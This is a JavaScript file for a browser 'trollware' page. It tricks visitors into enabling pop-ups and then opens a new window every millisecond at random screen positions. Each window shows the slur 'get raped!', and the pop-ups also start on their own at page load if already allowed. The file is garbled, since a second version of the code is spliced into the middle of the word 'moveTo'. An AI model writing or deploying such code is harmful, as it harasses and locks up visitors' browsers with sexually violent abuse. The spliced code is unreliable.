const allowButton = document.getElementById('allow-popups-button');
const popupMessage = document.getElementById('popup-message');
const mainMessage = document.getElementById('main-message');
const annoyingSound = document.getElementById('annoying-sound');

const message = "get raped!";
const windows = [];

function createMovingWindow() {
    const newWindow = window.open("", "", "width=200,height=100");
    if (newWindow) {
        newWindow.document.write(`<p style="font-size:20px;color:red;text-align:center;">${message}</p>`);
        newWindow.document.title = message;
        newWindow.movconst allowButton = document.getElementById('allow-popups-button');
const popupMessage = document.getElementById('popup-message');
const mainMessage = document.getElementById('main-message');
const annoyingSound = document.getElementById('annoying-sound');

const message = "get raped!";
const windows = [];

function createMovingWindow() {
    const newWindow = window.open("", "", "width=200,height=100");
    if (newWindow) {
        newWindow.document.write(`<p style="font-size:20px;color:red;text-align:center;">${message}</p>`);
        newWindow.document.title = message;
        newWindow.moveTo(Math.random() * screen.width, Math.random() * screen.height);
        newWindow.focus();
        windows.push(newWindow);
    }
}

function startTrollware() {
    popupMessage.style.display = 'none';
    mainMessage.style.display = 'block';
    annoyingSound.style.display = 'block';
    setInterval(() => {
        createMovingWindow();
    }, 1);
}

allowButton.addEventListener('click', () => {
    let testWindows = [];
    // Attempt to open two pop-ups
    for (let i = 0; i < 2; i++) {
        let win = window.open("", "", "width=1,height=1");
        if (win) {
            win.close();
            testWindows.push(win);
        }
    }
    setTimeout(() => {
        // If pop-ups were successfully opened, start the trollware
        if (testWindows.length === 2) {
            startTrollware();
        } else {
            // Otherwise, alert the user to enable pop-ups and try again
            alert('Please enable pop-ups in your browser settings and click the button again.');
        }
    }, 500);
});

// Check if pop-ups are already enabled on page load
document.addEventListener('DOMContentLoaded', () => {
    let testWindows = [];
    for (let i = 0; i < 2; i++) {
        let win = window.open("", "", "width=1,height=1");
        if (win) {
            win.close();
            testWindows.push(win);
        }
    }
    setTimeout(() => {
        if (testWindows.length === 2) {
            startTrollware();
        }
    }, 500);
});

window.addEventListener('beforeunload', () => {
    windows.forEach(win => win.close());
});
eTo(Math.random() * screen.width, Math.random() * screen.height);
        newWindow.focus();
        windows.push(newWindow);
    }
}

function startTrollware() {
    popupMessage.style.display = 'none';
    mainMessage.style.display = 'block';
    annoyingSound.style.display = 'block';
    setInterval(() => {
        createMovingWindow();
    }, 1);
}

allowButton.addEventListener('click', () => {
    createMovingWindow(); // Try opening one window to prompt the user to allow pop-ups
    setTimeout(() => {
        if (windows.length > 0) { // If at least one pop-up was created, start the trollware
            startTrollware();
        } else { // Otherwise, show the prompt again
            alert('Please allow pop-ups and click the button again.');
        }
    }, 1000);
});

window.addEventListener('beforeunload', () => {
    windows.forEach(win => win.close());
});
